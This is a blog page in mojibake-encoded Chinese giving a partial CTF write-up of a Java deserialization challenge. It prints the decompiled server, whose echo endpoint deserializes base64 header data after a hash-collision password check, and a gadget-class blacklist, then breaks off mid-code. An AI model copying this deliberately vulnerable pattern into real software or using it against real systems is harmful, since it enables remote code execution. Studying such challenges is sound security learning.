<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <title>ç™½ç™½æ¯›æ¯›</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/_custom.css">
<meta name="generator" content="Hexo 8.1.1"></head>
<body class="bg-post">

<div class="sidebar">
    <div class="header-info">
        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
        <div class="site-author">ç™½ç™½æ¯›æ¯›</div>
    </div>
    <nav class="nav">
        <a href="/">é¦–é¡µ</a>
        <a href="/categories">åˆ†ç±»</a>
        <a href="/archives">æ‰€æœ‰</a>
    </nav>
    <div class="contact-section">
        <p>If you want find me:</p>
        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
    </div>
</div>

<div class="content-area">
    
<div style="height: 60px;"></div>
<div class="content-wrapper">
    <article class="post-article">
        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">ISCTFjavaååºåˆ—åŒ–å¤ç°</h1>
        
        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
            <span>ğŸ“… å‘å¸ƒ: 2025-12-08</span>
            <span style="margin: 0 15px;">|</span>
            <span style="color: #007bff; font-weight: bold;">ğŸ“ æ›´æ–°: 2025-12-29</span>
            
            
             <span style="margin: 0 15px;">|</span>
             ğŸ“‚ å­¦ä¹ 
            
        </div>
        
        <div class="article-content">
            <p>åº”æŸä¸ªå­¦é•¿çš„å¼ºçƒˆè¦æ±‚ï¼Œæ‰å†™çš„ï¼Œä½ å¥½ã€‚</p>
<h1 id="é¢˜ç›®åï¼šRegretful-Deser"><a href="#é¢˜ç›®åï¼šRegretful-Deser" class="headerlink" title="#é¢˜ç›®åï¼šRegretful_Deser"></a>#é¢˜ç›®åï¼šRegretful_Deser</h1><p>æˆ‘ä¸æƒ³è¯´ï¼Œå…¶å®ï¼Œè¿˜æ²¡åšåˆ°è¿™ä¸€é¢˜å°±å·²ç»æœ‰æ‰€è€³é—»ï¼Œjavaååºåˆ—åŒ–ã€‚</p>
<p>è¦è¯´æˆ‘ä¼šï¼Œé‚£å½“ç„¶æ˜¯ä¸ä¼šäº†ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« å°±åªæ˜¯è¾¹åšè¾¹å­¦çš„ç¬”è®°ã€‚</p>
<p><img src="/images/QQ20251209-162949.png" alt="alt text"></p>
<p>ç»™äº†ä¸ªé¶æœºåŠ javaæºç ï¼Œå…¶å®æœ‰ç‚¹åƒé¶åœºçš„â€Java Developerâ€ (1)ï¼Œç‚¹é¶æœºè¿›å»æ˜¯å®Œå…¨æ²¡æœ‰ä¿¡æ¯ï¼Œåªèƒ½é è‡ªå·±æœé›†ã€‚</p>
<p>ä½†é¶åœºé‚£é¢˜è¿˜æ˜¯è¿œæ²¡æœ‰è¿™é¢˜btçš„ã€‚</p>
<p>è¿™é¢˜çš„åŸç†å°±æ˜¯javaååºåˆ—åŒ–ã€‚</p>
<p><img src="/images/QQ20251209-163244.png" alt="alt text"></p>
<p>è¿™è¾¹è´´ä¸€ä¸‹ä»€ä¹ˆå«ååºåˆ—åŒ–ã€‚</p>
<p>æˆ‘ç›®å‰è§åˆ°çš„ååºåˆ—åŒ–çš„webé¢˜åŸºæœ¬éƒ½æ˜¯phpä»£ç çš„ï¼Œæ‰€ä»¥è¿™æ˜¯ç¬¬ä¸€æ¬¡åšåˆ°javaçš„ååºåˆ—åŒ–ã€‚</p>
<p>ç®€å•æ¥è®²ï¼Œjavaç¨‹åºåœ¨ä¼ è¾“ä¸­ä¼šå°†å­˜æ”¾åœ¨å†…å­˜çš„å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æµï¼Œå†å‘é€ã€‚è€Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯å†™å‡ºæˆ‘ä»¬éœ€è¦å¯¹è±¡çš„å­—èŠ‚æµã€‚</p>
<p>å¯¹è±¡åŒ…å«å±æ€§å’Œæ–¹æ³•ã€‚</p>
<p>javaç¨‹åºåœ¨ç»„è£…å¯¹è±¡æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œç„¶åå»æ‰§è¡Œé‡Œé¢çš„å†…å®¹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œä¸Šæºç ã€‚</p>
<p><img src="/images/QQ20251209-164529.png" alt="alt text"></p>
<p>å¥½å§ï¼Œå…¶å®æ˜¯ä¸å¯èƒ½ä¸€ä¸ªä¸€ä¸ªè´´å‡ºæ¥çš„ï¼Œè¿™è¾¹è¿ç”¨çš„ç¨‹åºå«jadxï¼Œå› ä¸ºé¢˜ç›®ç»™æˆ‘ä»¬çš„æ˜¯jaræ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹æ˜¯çœ‹ä¸æ‡‚çš„ï¼Œé‚£æ˜¯ç»™è®¡ç®—æœºçœ‹çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†jaré‡Œé¢çš„å†…å®¹åç¼–è¯‘æˆæˆ‘ä»¬èƒ½çœ‹çš„å†…å®¹ï¼Œè¿™ä¸ªç¨‹åºå°±æ˜¯åç¼–è¯‘javaç”¨çš„ï¼Œreçš„è£…å¤‡ã€‚</p>
<blockquote>
<p>package org.example;</p>
<p>import com.sun.net.httpserver.HttpExchange;<br>import com.sun.net.httpserver.HttpHandler;<br>import com.sun.net.httpserver.HttpServer;<br>import com.sun.xml.fastinfoset.EncodingConstants;<br>import java.io.BufferedReader;<br>import java.io.ByteArrayInputStream;<br>import java.io.IOException;<br>import java.io.InputStream;<br>import java.io.InputStreamReader;<br>import java.io.OutputStream;<br>import java.io.UnsupportedEncodingException;<br>import java.net.InetSocketAddress;<br>import java.net.URI;<br>import java.net.URLDecoder;<br>import java.nio.charset.StandardCharsets;<br>import java.util.Base64;<br>import java.util.HashMap;<br>import java.util.List;<br>import java.util.Map;<br>import java.util.concurrent.Executor;</p>
<p>&#x2F;* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org&#x2F;example&#x2F;Main.class *&#x2F;<br>public class Main {<br>    public static void main(String[] args) throws Exception {<br>        HttpServer server &#x3D; HttpServer.create(new InetSocketAddress(8080), 0);<br>        server.createContext(â€œ&#x2F;â€œ, new IndexHandler());<br>        server.createContext(â€œ&#x2F;helloâ€, new HelloHandler());<br>        server.createContext(â€œ&#x2F;api&#x2F;echoâ€, new EchoHandler());<br>        server.setExecutor((Executor) null);<br>        System.out.println(â€œServer started at <a target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080</a>â€œ);<br>        server.start();<br>    }</p>
<p>package org.example;</p>
<p>import com.sun.net.httpserver.HttpExchange;<br>import com.sun.net.httpserver.HttpHandler;<br>import com.sun.net.httpserver.HttpServer;<br>import com.sun.xml.fastinfoset.EncodingConstants;<br>import java.io.BufferedReader;<br>import java.io.ByteArrayInputStream;<br>import java.io.IOException;<br>import java.io.InputStream;<br>import java.io.InputStreamReader;<br>import java.io.OutputStream;<br>import java.io.UnsupportedEncodingException;<br>import java.net.InetSocketAddress;<br>import java.net.URI;<br>import java.net.URLDecoder;<br>import java.nio.charset.StandardCharsets;<br>import java.util.Base64;<br>import java.util.HashMap;<br>import java.util.List;<br>import java.util.Map;<br>import java.util.concurrent.Executor;</p>
<p>&#x2F;* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org&#x2F;example&#x2F;Main.class *&#x2F;<br>public class Main {<br>    public static void main(String[] args) throws Exception {<br>        HttpServer server &#x3D; HttpServer.create(new InetSocketAddress(8080), 0);<br>        server.createContext(â€œ&#x2F;â€œ, new IndexHandler());<br>        server.createContext(â€œ&#x2F;helloâ€, new HelloHandler());<br>        server.createContext(â€œ&#x2F;api&#x2F;echoâ€, new EchoHandler());<br>        server.setExecutor((Executor) null);<br>        System.out.println(â€œServer started at <a target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080</a>â€œ);<br>        server.start();<br>    }</p>
<p>&#x2F;* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org&#x2F;example&#x2F;Main$IndexHandler.class *&#x2F;<br>static class IndexHandler implements HttpHandler {<br>    IndexHandler() {<br>    }</p>
<p>public void handle(HttpExchange exchange) throws IOException {<br>    String method &#x3D; exchange.getRequestMethod();<br>    if (!â€GETâ€.equalsIgnoreCase(method)) {<br>        Main.sendText(exchange, 405, â€œMethod Not Allowedâ€);<br>    } else {<br>        Main.sendHtml(exchange, EncodingConstants.UNEXPANDED_ENTITY_REFERENCE, â€œhello indexâ€);<br>    }<br>}</p>
<p>}</p>
<p>&#x2F;* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org&#x2F;example&#x2F;Main$HelloHandler.class *&#x2F;<br>static class HelloHandler implements HttpHandler {<br>    HelloHandler() {<br>    }</p>
<p>public void handle(HttpExchange exchange) throws IOException {<br>    if (!â€GETâ€.equalsIgnoreCase(exchange.getRequestMethod())) {<br>        Main.sendText(exchange, 405, â€œMethod Not Allowedâ€);<br>        return;<br>    }<br>    URI uri &#x3D; exchange.getRequestURI();<br>    Map&lt;String, String&gt; queryParams &#x3D; Main.parseQuery(uri.getRawQuery());<br>    String name &#x3D; queryParams.getOrDefault(â€œnameâ€, â€œWorldâ€);<br>    String response &#x3D; â€œHello, â€œ + name + â€œ!â€;<br>    Main.sendText(exchange, EncodingConstants.UNEXPANDED_ENTITY_REFERENCE, response);<br>}</p>
<p>}</p>
<p>&#x2F;* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org&#x2F;example&#x2F;Main$EchoHandler.class *&#x2F;<br>static class EchoHandler implements HttpHandler {<br>    EchoHandler() {<br>    }</p>
<p>public void handle(HttpExchange exchange) throws IOException {<br>    List<String> cookie &#x3D; exchange.getRequestHeaders().get(â€œPassâ€);<br>    String pass &#x3D; cookie.get(0);<br>    if (!pass.equals(â€œn1ghtâ€) &amp;&amp; pass.hashCode() &#x3D;&#x3D; â€œn1ghtâ€.hashCode()) {<br>        List<String> echo &#x3D; exchange.getRequestHeaders().get(â€œechoâ€);<br>        String s &#x3D; echo.get(0);<br>        byte[] decode &#x3D; Base64.getDecoder().decode(s);<br>        try {<br>            new SecurityObjectInputStream(new ByteArrayInputStream(decode)).readObject();<br>        } catch (ClassNotFoundException e) {<br>            throw new RuntimeException(e);<br>        }<br>    }<br>}</p>
<p>}</p>
<p>&#x2F;* JADX INFO: Access modifiers changed from: private *&#x2F;<br>public static void sendText(HttpExchange exchange, int statusCode, String text) throws IOException {<br>    byte[] bytes &#x3D; text.getBytes(StandardCharsets.UTF_8);<br>    exchange.getResponseHeaders().set(â€œContent-Typeâ€, â€œtext&#x2F;plain; charset&#x3D;utf-8â€);<br>    exchange.sendResponseHeaders(statusCode, bytes.length);<br>    OutputStream os &#x3D; exchange.getResponseBody();<br>    Throwable th &#x3D; null;<br>    try {<br>        try {<br>            os.write(bytes);<br>            if (os !&#x3D; null) {<br>                if (0 !&#x3D; 0) {<br>                    try {<br>                        os.close();<br>                        return;<br>                    } catch (Throwable th2) {<br>                        th.addSuppressed(th2);<br>                        return;<br>                    }<br>                }<br>                os.close();<br>            }<br>        } catch (Throwable th3) {<br>            th &#x3D; th3;<br>            throw th3;<br>        }<br>    } catch (Throwable th4) {<br>        if (os !&#x3D; null) {<br>            if (th !&#x3D; null) {<br>                try {<br>                    os.close();<br>                } catch (Throwable th5) {<br>                    th.addSuppressed(th5);<br>                }<br>            } else {<br>                os.close();<br>            }<br>        }<br>        throw th4;<br>    }<br>}</p>
<p>&#x2F;* JADX INFO: Access modifiers changed from: private *&#x2F;<br>public static void sendHtml(HttpExchange exchange, int statusCode, String html) throws IOException {<br>    byte[] bytes &#x3D; html.getBytes(StandardCharsets.UTF_8);<br>    exchange.getResponseHeaders().set(â€œContent-Typeâ€, â€œtext&#x2F;html; charset&#x3D;utf-8â€);<br>    exchange.sendResponseHeaders(statusCode, bytes.length);<br>    OutputStream os &#x3D; exchange.getResponseBody();<br>    Throwable th &#x3D; null;<br>    try {<br>        try {<br>            os.write(bytes);<br>            if (os !&#x3D; null) {<br>                if (0 !&#x3D; 0) {<br>                    try {<br>                        os.close();<br>                        return;<br>                    } catch (Throwable th2) {<br>                        th.addSuppressed(th2);<br>                        return;<br>                    }<br>                }<br>                os.close();<br>            }<br>        } catch (Throwable th3) {<br>            th &#x3D; th3;<br>            throw th3;<br>        }<br>    } catch (Throwable th4) {<br>        if (os !&#x3D; null) {<br>            if (th !&#x3D; null) {<br>                try {<br>                    os.close();<br>                } catch (Throwable th5) {<br>                    th.addSuppressed(th5);<br>                }<br>            } else {<br>                os.close();<br>            }<br>        }<br>        throw th4;<br>    }<br>}</p>
<p>&#x2F;* JADX WARN: Failed to apply debug info<br>java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.InsnArg.getType()â€ because â€œchangeArgâ€ is null<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.applyWithWiderIgnoreUnknown(TypeUpdate.java:74)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:137)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:133)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.searchAndApplyVarDebugInfo(DebugInfoApplyVisitor.java:75)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.lambda$applyDebugInfo$0(DebugInfoApplyVisitor.java:68)<br>    at java.base&#x2F;java.util.ArrayList.forEach(Unknown Source)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.applyDebugInfo(DebugInfoApplyVisitor.java:68)<br>    at jadx.core.dex.visitors.debuginfo.DebugInfoApplyVisitor.visit(DebugInfoApplyVisitor.java:55)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Failed to calculate best type for var: r8v0 ??<br>java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.InsnArg.getType()â€ because â€œchangeArgâ€ is null<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Failed to calculate best type for var: r8v0 ??<br>java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.InsnArg.getType()â€ because â€œchangeArgâ€ is null<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$1(TypeInferenceVisitor.java:101)<br>    at java.base&#x2F;java.util.ArrayList.forEach(Unknown Source)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Failed to calculate best type for var: r9v0 ??<br>java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.InsnArg.getType()â€ because â€œchangeArgâ€ is null<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Failed to calculate best type for var: r9v0 ??<br>java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.InsnArg.getType()â€ because â€œchangeArgâ€ is null<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)<br>    at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$1(TypeInferenceVisitor.java:101)<br>    at java.base&#x2F;java.util.ArrayList.forEach(Unknown Source)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)<br>    at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke â€œjadx.core.dex.instructions.args.RegisterArg.getSVar()â€ because the return value of â€œjadx.core.dex.nodes.InsnNode.getResult()â€ is null<br>    at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)<br>    at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)<br>    at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)<br>    at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)<br>    at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)<br>    at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)<br>    at java.base&#x2F;java.util.ArrayList.forEach(Unknown Source)<br>    at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)<br>    at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)<br> <em>&#x2F;<br>&#x2F;</em> JADX WARN: Not initialized variable reg: 8, insn: 0x00e9: MOVE (r0 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) &#x3D; (r8 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY] A[D(â€˜isrâ€™ java.io.InputStreamReader)]) A[TRY_LEAVE], block:B:53:0x00e9 <em>&#x2F;<br>&#x2F;</em> JADX WARN: Not initialized variable reg: 9, insn: 0x00ed: MOVE (r0 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) &#x3D; (r9 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]), block:B:55:0x00ed <em>&#x2F;<br>&#x2F;</em> JADX WARN: Type inference failed for: r8v0, names: [isr], types: [java.io.InputStreamReader] <em>&#x2F;<br>&#x2F;</em> JADX WARN: Type inference failed for: r9v0, types: [java.lang.Throwable] *&#x2F;<br>private static String readBody(HttpExchange exchange) throws IOException {<br>    ?? r8;<br>    ?? r9;<br>    InputStream is &#x3D; exchange.getRequestBody();<br>    Throwable th &#x3D; null;<br>    try {<br>        try {<br>            InputStreamReader inputStreamReader &#x3D; new InputStreamReader(is, StandardCharsets.UTF_8);<br>            Throwable th2 &#x3D; null;<br>            BufferedReader bufferedReader &#x3D; new BufferedReader(inputStreamReader);<br>            Throwable th3 &#x3D; null;<br>            try {<br>                try {<br>                    StringBuilder sb &#x3D; new StringBuilder();<br>                    while (true) {<br>                        String line &#x3D; bufferedReader.readLine();<br>                        if (line &#x3D;&#x3D; null) {<br>                            break;<br>                        }<br>                        sb.append(line);<br>                    }<br>                    String string &#x3D; sb.toString();<br>                    if (bufferedReader !&#x3D; null) {<br>                        if (0 !&#x3D; 0) {<br>                            try {<br>                                bufferedReader.close();<br>                            } catch (Throwable th4) {<br>                                th3.addSuppressed(th4);<br>                            }<br>                        } else {<br>                            bufferedReader.close();<br>                        }<br>                    }<br>                    if (inputStreamReader !&#x3D; null) {<br>                        if (0 !&#x3D; 0) {<br>                            try {<br>                                inputStreamReader.close();<br>                            } catch (Throwable th5) {<br>                                th2.addSuppressed(th5);<br>                            }<br>                        } else {<br>                            inputStreamReader.close();<br>                        }<br>                    }<br>                    return string;<br>                } catch (Throwable th6) {<br>                    if (bufferedReader !&#x3D; null) {<br>                        if (th3 !&#x3D; null) {<br>                            try {<br>                                bufferedReader.close();<br>                            } catch (Throwable th7) {<br>                                th3.addSuppressed(th7);<br>                            }<br>                        } else {<br>                            bufferedReader.close();<br>                        }<br>                    }<br>                    throw th6;<br>                }<br>            } finally {<br>            }<br>        } catch (Throwable th8) {<br>            if (r8 !&#x3D; 0) {<br>                if (r9 !&#x3D; 0) {<br>                    try {<br>                        r8.close();<br>                    } catch (Throwable th9) {<br>                        r9.addSuppressed(th9);<br>                    }<br>                } else {<br>                    r8.close();<br>                }<br>            }<br>            throw th8;<br>        }<br>    } finally {<br>        if (is !&#x3D; null) {<br>            if (0 !&#x3D; 0) {<br>                try {<br>                    is.close();<br>                } catch (Throwable th10) {<br>                    th.addSuppressed(th10);<br>                }<br>            } else {<br>                is.close();<br>            }<br>        }<br>    }<br>}</p>
<p>&#x2F;* JADX INFO: Access modifiers changed from: private *&#x2F;<br>public static Map&lt;String, String&gt; parseQuery(String query) throws UnsupportedEncodingException {<br>    Map&lt;String, String&gt; result &#x3D; new HashMap&lt;&gt;();<br>    if (query &#x3D;&#x3D; null || query.isEmpty()) {<br>        return result;<br>    }<br>    String[] pairs &#x3D; query.split(â€œ&amp;â€);<br>    for (String pair : pairs) {<br>        int idx &#x3D; pair.indexOf(61);<br>        if (idx &gt; 0 &amp;&amp; idx &lt; pair.length() - 1) {<br>            String key &#x3D; URLDecoder.decode(pair.substring(0, idx), String.valueOf(StandardCharsets.UTF_8));<br>            String value &#x3D; URLDecoder.decode(pair.substring(idx + 1), String.valueOf(StandardCharsets.UTF_8));<br>            result.put(key, value);<br>        } else if (idx &#x3D;&#x3D; -1) {<br>            String key2 &#x3D; URLDecoder.decode(pair, String.valueOf(StandardCharsets.UTF_8));<br>            result.put(key2, â€œâ€);<br>        }<br>    }<br>    return result;<br>} </p>
</blockquote>
<p><img src="/images/QQ20251209-171408.png" alt="alt text"></p>
<p>æ¼æ´ä»£ç ä»¥åŠæ¼æ´å¤„ã€‚</p>
<p>è¿™æ®µä»£ç åˆ†ä¸ºäº†ä¸€ä¸ªä¸»ç±»Mainï¼Œä¸‰ä¸ªå¤„ç†ç±»Handleã€‚</p>
<p><img src="/images/QQ20251209-171750.png" alt="alt text"></p>
<p>å…ˆçœ‹è¿™é‡Œï¼Œä»£ç è®¾å®šäº†ï¼Œå¦‚æœä½ æ˜¯GETï¼Œä»¥ä¼ å‚çš„æ–¹å¼è¿›å…¥ç½‘ç«™åˆ™è¿”å›hello indexï¼Œå¦‚æœä¸æ˜¯å°±æ˜¾ç¤º405.</p>
<p><img src="/images/QQ20251209-171950.png" alt="alt text"></p>
<p>å†çœ‹è¿™é‡Œï¼Œè¿™è¾¹å…¶å®æŒºå®¹æ˜“æ‡‚çš„ï¼Œè¦æ±‚æˆ‘ä»¬å¸¦ä¸ŠPassçš„æ•°å€¼ï¼ŒPassçš„å€¼ä¸ä¸ºn1ghtï¼Œä½†å®ƒçš„å“ˆå¸Œå€¼å¿…é¡»ä¸ºn1ghtçš„å“ˆå¸Œå€¼ã€‚è¿™è¾¹æ¶‰åŠåˆ°å“ˆå¸Œç¢°æ’ã€‚</p>
<p>é€šè¿‡äº†ä¹‹åï¼ŒæœåŠ¡å™¨å°±ä¼šè·å¾—æˆ‘ä»¬å‘é€çš„base64ç ï¼Œç„¶åè½¬åŒ–ä¸ºäºŒè¿›åˆ¶byte[],æœ€åå°†è¿™æ®µäºŒè¿›åˆ¶æµæ”¾å…¥try{}ä¸­ï¼Œå¯ä»¥çœ‹è§å…¶å®ä»£ç é‡Œæœ‰ä¸€ä¸ªSecurityObjectInputStreamï¼Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥å»çœ‹æºç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InvalidClassException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line">/* loaded from: n1ght_web-1.0-SNAPSHOT-jar-with-dependencies.jar:org/example/SecurityObjectInputStream.class */</span><br><span class="line">public class SecurityObjectInputStream extends ObjectInputStream &#123;</span><br><span class="line">    public static String[] blacklist = &#123;&quot;org.apache.commons.collections&quot;, &quot;javax.swing&quot;, &quot;com.sun.rowset&quot;, &quot;com.sun.org.apache.xalan&quot;, &quot;java.security&quot;, &quot;java.rmi.MarshalledObject&quot;, &quot;javax.management.remote.rmi.RMIConnector&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    public 